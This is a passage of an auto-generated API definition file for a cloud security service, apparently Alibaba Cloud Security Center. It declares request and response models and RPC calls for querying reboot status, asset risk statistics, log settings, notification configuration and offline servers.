async function describeInstanceAntiBruteForceRules(request: DescribeInstanceAntiBruteForceRulesRequest): DescribeInstanceAntiBruteForceRulesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstanceAntiBruteForceRules', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstanceRebootStatusRequest {
  uuids: string(name='Uuids', description='The UUIDs of the servers that you restart. Separate multiple UUIDs with commas (,).', example='d77f7802-4f0a-4221-ab02-4d999e****', position='Query'),
}

model DescribeInstanceRebootStatusResponseBody = {
  rebootStatuses?: [ 
    {
      code?: string(name='Code', description='The error code that is returned when the server failed to be restarted. Valid values:

*   **10001**: The restart command failed to be sent.
*   **10002**: The restart operation failed.
*   **10003**: A timeout error occurs.', example='10001'),
      msg?: string(name='Msg', description='The message that is returned when the server failed to be restarted.', example='push failed'),
      rebootStatus?: int32(name='RebootStatus', description='The status of the server. Valid values:

*   **0**: The server is being restarted.
*   **1**: The server is restarted.
*   **2**: The server failed to be restarted.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='9b59c2d6-0967-46e3-ad7b-152227c****'),
    }
  ](name='RebootStatuses', description='An array that consists of the status information about the servers that you restart.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeInstanceRebootStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceRebootStatusResponseBody(name='body'),
}

async function describeInstanceRebootStatus(request: DescribeInstanceRebootStatusRequest): DescribeInstanceRebootStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstanceRebootStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstanceStatisticsRequest {
  from: string(name='From', description='The source of the request. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUIDs of the assets to query. Separate multiple UUIDs with commas (,). You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of assets.', example='6690a46c-0edb-4663-a641-3629d1a9****', position='Query'),
}

model DescribeInstanceStatisticsResponseBody = {
  data?: [ 
    {
      account?: int32(name='Account', description='The number of unusual logons by using the account of the asset.', example='0'),
      agentlessAll?: int32(name='AgentlessAll', description='The number of alerts generated by the agentless detection feature.', example='13'),
      agentlessBaseline?: int32(name='AgentlessBaseline', description='The number of baseline risks detected by the agentless detection feature.', example='2'),
      agentlessMalicious?: int32(name='AgentlessMalicious', description='The number of malicious samples detected by the agentless detection feature.', example='3'),
      agentlessVulCve?: int32(name='AgentlessVulCve', description='The number of system vulnerabilities detected by the agentless detection feature.', example='1'),
      agentlessVulSca?: int32(name='AgentlessVulSca', description='The number of application vulnerabilities detected by the agentless detection feature.', example='1'),
      agentlessVulSys?: int32(name='AgentlessVulSys', example='1'),
      appNum?: int32(name='AppNum', description='The number of application vulnerabilities detected on the asset.', example='1'),
      cmsNum?: int32(name='CmsNum', description='The number of Web-CMS vulnerabilities detected on the asset.', example='5'),
      cspmNum?: int32(name='CspmNum', description='The number of configuration risks detected on the asset.', example='1'),
      cveNum?: int32(name='CveNum', description='The number of common vulnerabilities detected on the asset.', example='1'),
      emgNum?: int32(name='EmgNum', description='The number of urgent vulnerabilities detected on the asset.', example='6'),
      health?: int32(name='Health', description='The number of baseline risks detected on the asset.', example='2'),
      scaNum?: int32(name='ScaNum', description='The number of middleware vulnerabilities detected on the asset.', example='1'),
      suspicious?: int32(name='Suspicious', description='The number of alerts generated on the asset.', example='2'),
      sysNum?: int32(name='SysNum', description='The number of Windows system vulnerabilities detected on the asset.', example='3'),
      trojan?: int32(name='Trojan', description='The number of trojans detected on the asset.', example='1'),
      uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
      vul?: int32(name='Vul', description='The total number of vulnerabilities detected on the asset.', example='17'),
      weakPWNum?: int32(name='WeakPWNum', description='The number of weak passwords.', example='22'),
    }
  ](name='Data', description='An array that consists of the risk information about assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8F035A9D-D19F-5430-8CA5-1497991B7C61'),
}

model DescribeInstanceStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceStatisticsResponseBody(name='body'),
}

async function describeInstanceStatistics(request: DescribeInstanceStatisticsRequest): DescribeInstanceStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstanceStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeIpTagsRequest {
  ip: string(name='Ip', description='The IP address in the alert event.', example='192.168.XX.XX', position='Query'),
  securityEventId: string(name='SecurityEventId', description='The ID of the alert event.', example='11', position='Query'),
}

model DescribeIpTagsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='E70074C8-DFB4-44C5-96C7-909DXXXXXXX'),
  tags?: string(name='Tags', description='The tags that are added to the IP address.', example='latest'),
}

model DescribeIpTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeIpTagsResponseBody(name='body'),
}

async function describeIpTags(request: DescribeIpTagsRequest): DescribeIpTagsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeIpTags', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLatestScanTaskRequest {
}

model DescribeLatestScanTaskResponseBody = {
  lastCheckTime?: long(name='LastCheckTime', example='1671610264000'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
  riskNum?: int32(name='RiskNum', example='1'),
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLatestScanTaskResponseBody(name='body'),
}

async function describeLatestScanTask(request: DescribeLatestScanTaskRequest): DescribeLatestScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLatestScanTask', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLogMetaRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.168.XX.XX', position='Query'),
}

model DescribeLogMetaResponseBody = {
  logMetaList?: [ 
    {
      category?: string(name='Category', description='The category of logs. Valid values:

*   **host**: host logs
*   **network**: network logs
*   **security**: security logs', example='host'),
      hotTtl?: int32(name='HotTtl', description='The time period after which logs in hot storage are moved to cold storage. Unit: days.

>  If the value is **-1**, logs that are stored in hot storage are not moved to cold storage.', example='-1'),
      logDesc?: string(name='LogDesc', description='The name of the log type.', example='Login'),
      logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
      project?: string(name='Project', description='The name of the project.', example='aegis-log'),
      status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **disabled**
*   **enabled**', example='enabled'),
      topic?: string(name='Topic', description='The topic of logs that are delivered.', example='aegis-log-login'),
      ttl?: int32(name='Ttl', description='The number of days during which logs can be retained.', example='180'),
      userLogStore?: string(name='UserLogStore', description='The name of the dedicated Logstore in which user logs are stored.', example='aegis-log-network'),
      userProject?: string(name='UserProject', description='The name of the dedicated project in which logs are stored.', example='sasnew-log-XXXX-cn-hangzhou'),
      userRegion?: string(name='UserRegion', description='The ID of the region.', example='cn-hangzhou'),
    }
  ](name='LogMetaList', description='An array that consists of the configurations of the log analysis feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeLogMetaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogMetaResponseBody(name='body'),
}

async function describeLogMeta(request: DescribeLogMetaRequest): DescribeLogMetaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLogMeta', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLogShipperStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
}

model DescribeLogShipperStatusResponseBody = {
  logShipperStatus?: {
    authStatus?: string(name='AuthStatus', description='Indicates whether Security Center is authorized to access Log Service. Valid values:

*   **yes**
*   **no**', example='yes'),
    buyStatus?: string(name='BuyStatus', description='Indicates whether the log analysis feature is purchased. Valid values:

*   **yes**
*   **no**', example='yes'),
    openStatus?: string(name='OpenStatus', description='The status of the log analysis feature. Valid values:

*   **yes**: enabled
*   **no**: disabled', example='yes'),
    postPaidOpenStatus?: string(name='PostPaidOpenStatus', description='Indicates whether the pay-as-you-go billing method is used. Valid values:

*   **yes**
*   **no**', example='no'),
    postPaidSupportStatus?: string(name='PostPaidSupportStatus', description='Indicates whether the log analysis feature supports the pay-as-you-go billing method. Valid values:

*   **yes**
*   **no**', example='yes'),
    slsProjectStatus?: string(name='SlsProjectStatus', description='The status of the dedicated Log Service project. Valid values:

*   **Normal**: normal
*   **Disable**: disabled', example='Normal'),
    slsServiceStatus?: string(name='SlsServiceStatus', description='Indicates whether Log Service is activated. Valid values:

*   **yes**
*   **no**', example='yes'),
  }(name='LogShipperStatus', description='The status information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeLogShipperStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogShipperStatusResponseBody(name='body'),
}

async function describeLogShipperStatus(request: DescribeLogShipperStatusRequest): DescribeLogShipperStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLogShipperStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLoginBaseConfigsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5', position='Query'),
  target?: string(name='Target', description='The server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID or group ID of the server to add or delete.

> If targetType is set to uuid, the value of Target is the UUID of the server. If targetType is set to groupId, the value of Target is the group ID of the server. If targetType is set to global, the value of Target is a hyphen (-).

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group
    *   **global**: all servers', example='[ {"target": "inet-7c676676-06fa-442e-90fb-b802e5d6****", "targetType": "uuid" } ]', position='Query'),
  type: string(name='Type', description='The logon type of the configuration to query. Valid values:

*   **login\\_common_location**: common logon location
*   **login\\_common_ip**: common logon IP address
*   **login\\_common_time**: common logon time range
*   **login\\_common_account**: common logon account', example='login_common_location', position='Query'),
}

model DescribeLoginBaseConfigsResponseBody = {
  baseConfigs?: [ 
    {
      account?: string(name='Account', description='The common logon account.', example='1582318****'),
      endTime?: string(name='EndTime', description='The end time of the common logon time range.', example='07:00'),
      ip?: string(name='Ip', description='The common logon IP address.', example='192.168.XX.XX'),
      location?: string(name='Location', description='The common logon location.', example='Montenegro'),
      remark?: string(name='Remark', description='Corresponding configuration remark information.', example='test'),
      startTime?: string(name='StartTime', description='The start time of the common logon time range.', example='08:00'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The UUID or group ID of the server.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The type of the server to which the configuration is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group
*   **global**: all servers', example='uuid'),
        }
      ](name='TargetList', description='The details of the servers to which the configuration is applied.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='172'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configuration is applied.', example='13'),
    }
  ](name='BaseConfigs', description='The description of the configuration.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C2D4B3C-0524-17B1-93D2-DA50119F4E1E'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
}

model DescribeLoginBaseConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginBaseConfigsResponseBody(name='body'),
}

async function describeLoginBaseConfigs(request: DescribeLoginBaseConfigsRequest): DescribeLoginBaseConfigsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLoginBaseConfigs', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLoginSwitchConfigsRequest {
}

model DescribeLoginSwitchConfigsResponseBody = {
  configList?: [ 
    {
      item?: string(name='Item', description='The type of the alert that you enabled or disabled. Valid values:

*   **login\\_common_ip**: alerts for unapproved logon IP addresses
*   **login\\_common_time**: alerts for unapproved logon time ranges
*   **login\\_common_account**: alerts for unapproved logon accounts', example='login_common_ip'),
      status?: int32(name='Status', description='The status of the Log Service feature. Valid values:

*   **0**: The feature is disabled.
*   **1**: The feature is enabled.', example='0'),
    }
  ](name='ConfigList', description='The configuration item returned.'),
  count?: int32(name='Count', description='The number of returned configuration items.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeLoginSwitchConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginSwitchConfigsResponseBody(name='body'),
}

async function describeLoginSwitchConfigs(request: DescribeLoginSwitchConfigsRequest): DescribeLoginSwitchConfigsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLoginSwitchConfigs', 'POST', '/', 'json', false, 'json', request);
}

model DescribeLogstoreStorageRequest {
  from: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeLogstoreStorageResponseBody = {
  logstore?: string(name='Logstore', description='The name of the dedicated Logstore that is used to store full logs of Security Center. The value is fixed as **sas-log**.', example='sas-log'),
  preserve?: long(name='Preserve', description='The purchased log storage capacity, in GB.', example='12240'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
  ttl?: int32(name='Ttl', description='The number of days during which logs can be retained. The value is fixed as **180**, which indicates that logs can be retained for 180 days.

>  You are not allowed to change the value of this parameter.', example='180'),
  used?: long(name='Used', description='The used log storage capacity, in GB.', example='335'),
  userProject?: string(name='UserProject', description='The name of the dedicated Project that is used to store full logs of Security Center.', example='sas-log-XXXX-cn-hangzhou'),
}

model DescribeLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogstoreStorageResponseBody(name='body'),
}

async function describeLogstoreStorage(request: DescribeLogstoreStorageRequest): DescribeLogstoreStorageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeLogstoreStorage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeMachineCanRebootRequest {
  type?: string(name='Type', description='The type of the vulnerabilities. Valid values:

*   cve: Linux software vulnerabilities
*   sys: Windows system vulnerabilities', example='sys', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='5b268326-273e-44fc-a0e3-9482435c****', position='Query'),
}

model DescribeMachineCanRebootResponseBody = {
  canReboot?: boolean(name='CanReboot', description='Indicates whether the server can be restarted. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeMachineCanRebootResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeMachineCanRebootResponseBody(name='body'),
}

async function describeMachineCanReboot(request: DescribeMachineCanRebootRequest): DescribeMachineCanRebootResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeMachineCanReboot', 'POST', '/', 'json', false, 'json', request);
}

model DescribeModuleConfigRequest {
}

model DescribeModuleConfigResponseBody = {
  count?: int32(name='Count', example='2'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', example='173'),
          instanceId?: string(name='InstanceId', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', example='inStanceName****'),
          ip?: string(name='Ip', example='31.13.XX.XX'),
          region?: string(name='Region', example='cn-hangzhou'),
          uuid?: string(name='Uuid', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items'),
      moduleName?: string(name='ModuleName', example='alihids'),
    }
  ](name='ModuleConfigList'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', example='true'),
}

model DescribeModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeModuleConfigResponseBody(name='body'),
}

async function describeModuleConfig(request: DescribeModuleConfigRequest): DescribeModuleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeModuleConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeMonitorAccountsRequest {
}

model DescribeMonitorAccountsResponseBody = {
  accountIds?: [ string ](name='AccountIds', description='The IDs of the members.'),
  requestId?: string(name='RequestId', description='The request ID.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
}

model DescribeMonitorAccountsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeMonitorAccountsResponseBody(name='body'),
}

async function describeMonitorAccounts(request: DescribeMonitorAccountsRequest): DescribeMonitorAccountsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeMonitorAccounts', 'POST', '/', 'json', false, 'json', request);
}

model DescribeNoticeConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='60.191.XX.XX', position='Query'),
}

model DescribeNoticeConfigResponseBody = {
  noticeConfigList?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='12123414****'),
      currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
      project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun\\_security_Weekreport**: notification for vulnerabilities
*   **yundun\\_sas\\_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun\\_aegis\\_AV_true**: notification for precision defense
*   **yundun\\_sas\\_ak_leakage**: notification for AccessKey pair leaks
*   **yundun\\_sas\\_config_alert**: notification for configuration assessment
*   **yundun\\_sas\\_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun\\_webguard_event**: notification for web tamper proofing
*   **yundun\\_sas\\_cloud\\_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun\\_sas\\_cloud\\_native\\_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun\\_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun\\_sas\\_anti\\_virus_config**: notification for virus scan
*   **yundun\\_sas_log**: notification for excess logs
*   **yundun\\_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun\\_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun\\_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun\\_sas\\_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun\\_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='sas_suspicious'),
      route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='7'),
      timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
    }
  ](name='NoticeConfigList', description='An array that consists of the notification settings.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D185B7FF-E24C-422D-83D3-C2A25C7A2727'),
}

model DescribeNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNoticeConfigResponseBody(name='body'),
}

async function describeNoticeConfig(request: DescribeNoticeConfigRequest): DescribeNoticeConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeNoticeConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeNsasSuspEventTypeRequest {
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster', example='clusterId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='ca3108551c83c4d949106e1ab9e1e****', position='Query'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon', position='Query'),
  remark?: string(name='Remark', description='The name of the server.', example='testECS', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.212.XX.XX', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='f56406cb-916d-42db-b6f7-2ff79e34****', position='Query'),
}

model DescribeNsasSuspEventTypeResponseBody = {
  eventTypes?: [ 
    {
      name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon'),
      suspEventCount?: int32(name='SuspEventCount', description='The number of assets for which an alert of the type is generated.', example='22'),
      type?: string(name='Type', description='The alert type.', example='Unusual Logon'),
    }
  ](name='EventTypes', description='An array that consists of the information about the alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DescribeNsasSuspEventTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNsasSuspEventTypeResponseBody(name='body'),
}

async function describeNsasSuspEventType(request: DescribeNsasSuspEventTypeRequest): DescribeNsasSuspEventTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeNsasSuspEventType', 'POST', '/', 'json', false, 'json', request);
}

model DescribeOfflineMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4', position='Query'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5', position='Query'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou', position='Query'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou', position='Query'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX', position='Query'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0', position='Query'),
}

model DescribeOfflineMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model DescribeOfflineMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOfflineMachinesResponseBody(name='body'),
}

async function describeOfflineMachines(request: DescribeOfflineMachinesRequest): DescribeOfflineMachinesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeOfflineMachines', 'POST', '/', 'json', false, 'json', request);
}

model DescribeOnceTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  endTimeQuery?: long(name='EndTimeQuery', description='The timestamp when the root task ends. Unit: milliseconds.', example='1651766520000', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the root task.

> You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='bb5d657479bba5e1d308b6c9e85c9174', position='Query'),
  startTimeQuery?: long(name='StartTimeQuery', description='The timestamp when the root task starts. Unit: milliseconds.', example='1651737301000', position='Query'),
  taskId?: string(name='TaskId', description='The ID of the task.', example='d7b2acf8d362742123e4a84e1bf8****', position='Query'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection

> You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='CLIENT_PROBLEM_CHECK', position='Query'),
}

model DescribeOnceTaskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  taskManageResponseList?: [ 
    {
      detailData?: string(name='DetailData', description='The execution details of the task. The value of this parameter is in the JSON format.

*   **causeCode**: the returned code for the cause.
